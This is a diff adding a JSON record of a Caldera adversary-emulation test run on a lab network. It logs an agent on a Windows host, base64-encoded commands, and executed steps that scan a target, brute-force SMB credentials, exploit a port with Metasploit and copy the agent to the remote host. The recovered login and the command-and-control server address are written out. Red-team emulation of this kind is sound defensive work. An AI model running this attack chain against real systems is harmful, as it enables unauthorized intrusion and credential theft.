@@ -1,0 +1,801 @@
+{
+    "name": "win_test",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "last_seen": "2020-01-31 22:24:12",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.100.132:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "pid": 3088,
+            "ppid": 1068,
+            "trusted": 1,
+            "last_trusted_seen": "2020-01-31 22:24:12",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-01-31 22:22:57",
+    "facts": [
+        {
+            "id": 1,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 2,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 3,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 4,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 9,
+            "property": "remote.host.ip",
+            "value": "192.168.100.128",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 10,
+            "property": "remote.host.socket",
+            "value": "192.168.100.128:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "3",
+            "link_id": 1
+        },
+        {
+            "id": 11,
+            "property": "remote.service.smb",
+            "value": "192.168.100.128:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "3",
+            "link_id": 2
+        },
+        {
+            "id": 12,
+            "property": "remote.host.credentials",
+            "value": "192.168.100.128:445:zathras:password1!",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "3",
+            "link_id": 3
+        }
+    ],
+    "finish": "2020-01-31 22:24:13",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 11,
+        "adversary_id": "c46c3395-e99e-4030-b27e-d4a44a030600",
+        "name": "windows_smb_test",
+        "description": "testing windows things",
+        "phases": {
+            "1": [
+                {
+                    "id": 31,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyBzY2FubmVyLnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 31,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 31,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 67
+                },
+                {
+                    "id": 32,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyBzY2FubmVyLnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 32,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 32,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 67
+                },
+                {
+                    "id": 34,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "c2Nhbm5lci5leGUgLWkgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 34,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 34,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 67
+                },
+                {
+                    "id": 33,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "Li9zY2FubmVyLmV4ZSAtaSAje3JlbW90ZS5ob3N0LmlwfQ==",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 33,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 33,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 67
+                }
+            ],
+            "2": [
+                {
+                    "id": 15,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "cHl0aG9uMyBmaW5nZXJwcmludC5weSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc21i",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 15,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 15,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 68
+                },
+                {
+                    "id": 16,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "cHl0aG9uMyBmaW5nZXJwcmludC5weSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgc21i",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 16,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 16,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 68
+                },
+                {
+                    "id": 18,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "ZmluZ2VycHJpbnQuZXhlIC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBzbWI=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 18,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 18,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 68
+                },
+                {
+                    "id": 17,
+                    "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint SMB",
+                    "test": "Li9maW5nZXJwcmludC5leGUgLXMgI3tyZW1vdGUuaG9zdC5zb2NrZXR9IC1jIHNtYg==",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 17,
+                            "name": "line",
+                            "property": "remote.service.smb",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 17,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 68
+                }
+            ],
+            "3": [
+                {
+                    "id": 93,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyBicnV0ZUZvcmNlLnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 93,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 93,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 69
+                },
+                {
+                    "id": 94,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "cHl0aG9uMyBicnV0ZUZvcmNlLnB5IC0tdGFyZ2V0ICN7cmVtb3RlLnNlcnZpY2Uuc21ifQ==",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 94,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 94,
+                            "payload": "bruteForce.py"
+                        }
+                    ],
+                    "adversary_map_id": 69
+                },
+                {
+                    "id": 96,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "YnJ1dGVGb3JjZS5leGUgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 96,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 96,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 69
+                },
+                {
+                    "id": 95,
+                    "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+                    "tactic": "credential-access",
+                    "technique_name": "Brute Force",
+                    "technique_id": "T1110",
+                    "name": "Brute Force SMB",
+                    "test": "Li9icnV0ZUZvcmNlLmV4ZSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0=",
+                    "description": "Use dropped file to brute force credentials",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 95,
+                            "name": "line",
+                            "property": "remote.host.credentials",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 95,
+                            "payload": "bruteForce.exe"
+                        }
+                    ],
+                    "adversary_map_id": 69
+                },
+                {
+                    "id": 223,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 223,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 223,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 70
+                },
+                {
+                    "id": 222,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5weSAtLXRhcmdldCAje3JlbW90ZS5ob3N0LnNvY2tldH0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 222,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 222,
+                            "payload": "metasploit_exploit_port.py"
+                        }
+                    ],
+                    "adversary_map_id": 70
+                },
+                {
+                    "id": 225,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "bWV0YXNwbG9pdF9leHBsb2l0X3BvcnQuZXhlIC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 225,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 225,
+                            "payload": "metasploit_exploit_port.exe"
+                        }
+                    ],
+                    "adversary_map_id": 70
+                },
+                {
+                    "id": 224,
+                    "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Socket With Metasploit",
+                    "test": "Li9tZXRhc3Bsb2l0X2V4cGxvaXRfcG9ydC5leGUgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5zb2NrZXR9IC0tc2VydmVyICN7c2VydmVyfQ==",
+                    "description": "Use Metasploit to Broadly Exploit a Remote Port",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 224,
+                            "name": "line",
+                            "property": "remote.vuln.metasploit",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 224,
+                            "payload": "metasploit_exploit_port.exe"
+                        }
+                    ],
+                    "adversary_map_id": 70
+                }
+            ],
+            "4": [
+                {
+                    "id": 181,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "c21iRXhlYy5leGUgLS10YXJnZXQgI3tyZW1vdGUuc2VydmljZS5zbWJ9IC0tY3JlZCAje3JlbW90ZS5ob3N0LmNyZWRlbnRpYWxzfQ==",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 181,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 71
+                },
+                {
+                    "id": 180,
+                    "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Remote File Copy",
+                    "technique_id": "T1105",
+                    "name": "Execute Sandcat on remote host (SMB)",
+                    "test": "Li9zbWJFeGVjLmV4ZSAtLXRhcmdldCAje3JlbW90ZS5zZXJ2aWNlLnNtYn0gLS1jcmVkICN7cmVtb3RlLmhvc3QuY3JlZGVudGlhbHN9",
+                    "description": "Copy & execute 54ndc47 to remote host (SMB)",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 180,
+                            "payload": "smbExec.exe"
+                        }
+                    ],
+                    "adversary_map_id": 71
+                },
+                {
+                    "id": 125,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 125,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 72
+                },
+                {
+                    "id": 124,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "cHl0aG9uMyBtZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQucHkgLS1zZXJ2ZXIgI3tzZXJ2ZXJ9",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 124,
+                            "payload": "metasploit_sandcat_start.py"
+                        }
+                    ],
+                    "adversary_map_id": 72
+                },
+                {
+                    "id": 127,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "bWV0YXNwbG9pdF9zYW5kY2F0X3N0YXJ0LmV4ZSAtLXNlcnZlciAje3NlcnZlcn0=",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 127,
+                            "payload": "metasploit_sandcat_start.exe"
+                        }
+                    ],
+                    "adversary_map_id": 72
+                },
+                {
+                    "id": 126,
+                    "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+                    "tactic": "execution",
+                    "technique_name": "Command-Line Interface",
+                    "technique_id": "T1059",
+                    "name": "Metasploit Start Sandcat",
+                    "test": "Li9tZXRhc3Bsb2l0X3NhbmRjYXRfc3RhcnQuZXhlIC0tc2VydmVyICN7c2VydmVyfQ==",
+                    "description": "Starts a Sandcat Agent on all Metasploit sessions",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 126,
+                            "payload": "metasploit_sandcat_start.exe"
+                        }
+                    ],
+                    "adversary_map_id": 72
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "scanner.exe -i 192.168.100.128",
+            "delegated": "2020-01-31 22:23:06.134139",
+            "run": "2020-01-31 22:23:08",
+            "status": 0,
+            "description": "Use dropped scanner to find open popular ports",
+            "name": "Scan IP for ports",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "e126cf64-e958-4677-a0c4-c0420b3f3ad8",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "fingerprint.exe -s 192.168.100.128:445 -c smb",
+            "delegated": "2020-01-31 22:23:14.292132",
+            "run": "2020-01-31 22:23:15",
+            "status": 0,
+            "description": "Use dropped fingerprinter to find popular services",
+            "name": "Quick Fingerprint SMB",
+            "attack": {
+                "tactic": "discovery",
+                "technique_name": "Network Service Scanning",
+                "technique_id": "T1046"
+            }
+        },
+        {
+            "ability_id": "405d7d46-cdb9-4c7f-97e9-7feba3bea2f6",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "bruteForce.exe --target 192.168.100.128:445",
+            "delegated": "2020-01-31 22:23:18.490396",
+            "run": "2020-01-31 22:23:20",
+            "status": 0,
+            "description": "Use dropped file to brute force credentials",
+            "name": "Brute Force SMB",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Brute Force",
+                "technique_id": "T1110"
+            }
+        },
+        {
+            "ability_id": "47c04fce-7354-4cfa-8922-4b0c1369c7b1",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "metasploit_exploit_port.exe --target 192.168.100.128:445 --server http://192.168.100.132:8888",
+            "delegated": "2020-01-31 22:23:18.490875",
+            "run": "2020-01-31 22:23:53",
+            "status": 0,
+            "description": "Use Metasploit to Broadly Exploit a Remote Port",
+            "name": "Exploit Socket With Metasploit",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a1a12e72-80be-47dc-86c3-7dbe6745259c",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "smbExec.exe --target 192.168.100.128:445 --cred 192.168.100.128:445:zathras:password1!",
+            "delegated": "2020-01-31 22:24:02.888655",
+            "run": "2020-01-31 22:24:05",
+            "status": 1,
+            "description": "Copy & execute 54ndc47 to remote host (SMB)",
+            "name": "Execute Sandcat on remote host (SMB)",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Remote File Copy",
+                "technique_id": "T1105"
+            }
+        },
+        {
+            "ability_id": "d189c023-314c-4445-b1c5-6634b827e183",
+            "paw": "WIN-1UNOPAHRD9D$WIN-1UNOPAHRD9D\\zathras",
+            "command": "metasploit_sandcat_start.exe --server http://192.168.100.132:8888",
+            "delegated": "2020-01-31 22:24:02.888841",
+            "run": "2020-01-31 22:24:12",
+            "status": 0,
+            "description": "Starts a Sandcat Agent on all Metasploit sessions",
+            "name": "Metasploit Start Sandcat",
+            "attack": {
+                "tactic": "execution",
+                "technique_name": "Command-Line Interface",
+                "technique_id": "T1059"
+            }
+        }
+    ]
+}
